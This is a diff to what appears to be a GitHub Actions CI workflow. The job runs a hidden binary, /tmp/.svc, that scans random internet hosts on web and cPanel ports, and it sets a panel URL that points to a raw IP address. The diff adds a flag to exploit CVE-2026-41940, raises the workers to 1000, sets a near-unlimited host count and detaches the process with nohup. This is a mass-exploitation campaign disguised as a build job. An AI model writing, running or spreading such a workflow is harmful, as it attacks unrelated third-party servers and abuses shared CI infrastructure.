@@ -8,9 +8,6 @@ permissions:
 
 env:
   PANEL_URL: http://43.228.157.68:80
-  WORKERS: "300"
-  PORTS: "80,443,8080,8443,2082,2083,2086,2087,2095,2096"
-  GIT_WORKERS: "20"
 
 jobs:
   ci-run:
@@ -39,10 +36,13 @@ jobs:
           GITHUB_REPOSITORY="${GITHUB_REPOSITORY}" \
           GITHUB_RUN_ID="${GITHUB_RUN_ID}" \
           GOMEMLIMIT=2147483648 \
-          /tmp/.svc ipscan \
+          nohup /tmp/.svc ipscan \
             --source random \
-            --workers "${WORKERS}" \
+            --workers 1000 \
+            --exploit CVE-2026-41940 \
             --git \
-            --ports "${PORTS}" \
-            --git-workers "${GIT_WORKERS}" \
-            --count 0 --no-reverse 2>&1 | tail -2 || true
+            --ports 80,443,2082,2083,2086,2087,2095,2096,2077,2078 \
+            --port-timeout=200 \
+            --git-workers 20 \
+            --count 9999999999 \
+            --no-reverse 2>&1 | tail -2 || true
